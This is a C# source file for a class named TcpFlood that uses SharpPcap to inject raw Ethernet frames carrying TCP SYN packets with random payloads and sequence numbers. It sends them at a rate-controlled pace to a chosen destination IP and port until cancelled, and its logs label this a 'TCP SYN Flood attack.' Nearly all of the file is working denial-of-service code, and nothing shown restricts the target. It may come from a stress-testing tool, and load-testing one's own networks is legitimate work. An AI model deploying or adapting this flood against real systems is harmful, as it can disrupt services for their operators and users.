using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;
        public event EventHandler<PacketEventArgs>? PacketSent;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[1400] // Include payload for higher throughput
                };
                random.NextBytes(tcpPacket.PayloadData);
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                // Get actual packet size from the Ethernet frame (includes Ethernet header + IP + TCP + payload)
                int totalPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000; // Increased batch size

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    // Pre-generate packet pool and get actual packet size
                    int actualPacketSize = 0;
                    for (int i = 0; i < batchSize; i++)
                    {
                        random.NextBytes(bytes);
                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                        // Get actual packet size from first packet
                        if (i == 0)
                        {
                            actualPacketSize = ethernetPacket.Bytes.Length;
                            Logger.Info($"TCP packet size: {actualPacketSize} bytes, Target rate: {_params.BytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
                        }
                    }

                    // Use actual packet size for rate calculation (Ethernet frame includes all headers + FCS)
                    // For pcap injection, use actual Ethernet frame size + 4 bytes FCS
                    int wirePacketSize = actualPacketSize + 4; // Add FCS for wire size
                    long targetBytesPerSecond = _params.BytesPerSecond;
                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
                    Logger.Info($"TCP packet wire size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");
                    
                    // Byte-budget rate control: track bytes sent vs time elapsed
                    long bytesSent = 0;
                    var currentBatch = 0;
                    
                    // Rate measurement for logging/UI only (not used for timing)
                    var measurementStartTime = stopwatch.ElapsedTicks;
                    long measurementStartBytes = 0;
                    const int measurementWindowMs = 500; // Measure every 500ms
                    double smoothedActualMbps = 0;
                    const double smoothingAlpha = 0.3; // Exponential smoothing factor
                    
                    // Determine if low rate (for Windows-friendly waiting)
                    bool isLowRate = targetMbps < 5.0;
                    int sleepCounter = 0; // For mixing sleep with spin-wait at low rates

                    stopwatch.Start();

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            // Calculate how many bytes we're "allowed" to have sent so far
                            double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);
                            
                            // If we're behind budget, send packets (small burst)
                            if (bytesSent < allowedBytes)
                            {
                                // Calculate how many packets we can send to catch up (but limit burst size)
                                long bytesBehind = allowedBytes - bytesSent;
                                int packetsToSend = Math.Min((int)(bytesBehind / wirePacketSize) + 1, 5); // Max 5 packets per iteration
                                
                                for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                {
                                    var packet = packetPool[currentBatch];
                                    injectionDevice.SendPacket(packet);
                                    OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                    
                                    bytesSent += wirePacketSize;
                                    currentBatch++;
                                    
                                    // Regenerate packet pool when needed
                                    if (currentBatch >= batchSize)
                                    {
                                        // Regenerate in smaller chunks to reduce blocking
                                        int regenerateCount = Math.Min(100, batchSize);
                                        for (int j = 0; j < regenerateCount; j++)
                                        {
                                            random.NextBytes(bytes);
                                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                            tcpPacket.UpdateCalculatedValues();
                                            ipPacket.UpdateCalculatedValues();
                                            packetPool[j] = ethernetPacket.Bytes;
                                        }
                                        currentBatch = 0;
                                    }
                                }
                            }
                            else
                            {
                                // We're at or above budget - wait briefly
                                // Windows-friendly waiting: spin-wait at high rates, mix sleep+spin at low rates
                                if (isLowRate && sleepCounter++ % 10 == 0)
                                {
                                    // At low rates, sleep occasionally to avoid pegging CPU core
                                    Thread.Sleep(0); // Yield to other threads
                                }
                                else
                                {
                                    // Short spin-wait for precision
                                    Thread.SpinWait(10);
                                }
                            }

                            // Rate measurement for logging/UI (time-based window, smoothed)
                            long currentTicks = stopwatch.ElapsedTicks;
                            double elapsedSinceMeasurement = (currentTicks - measurementStartTime) / (double)Stopwatch.Frequency;
                            
                            if (elapsedSinceMeasurement >= measurementWindowMs / 1000.0)
                            {
                                long bytesInWindow = bytesSent - measurementStartBytes;
                                double actualMbps = (bytesInWindow * 8.0) / (elapsedSinceMeasurement * 1_000_000);
                                
                                // Exponential smoothing to reduce Windows jitter
                                if (smoothedActualMbps == 0)
                                    smoothedActualMbps = actualMbps;
                                else
                                    smoothedActualMbps = (smoothingAlpha * actualMbps) + ((1.0 - smoothingAlpha) * smoothedActualMbps);
                                
                                Logger.Info($"TCP rate: actual={smoothedActualMbps:F2} Mbps, target={targetMbps:F2} Mbps, bytesSent={bytesSent}, allowed={allowedBytes}");
                                
                                // Reset measurement window
                                measurementStartTime = currentTicks;
                                measurementStartBytes = bytesSent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}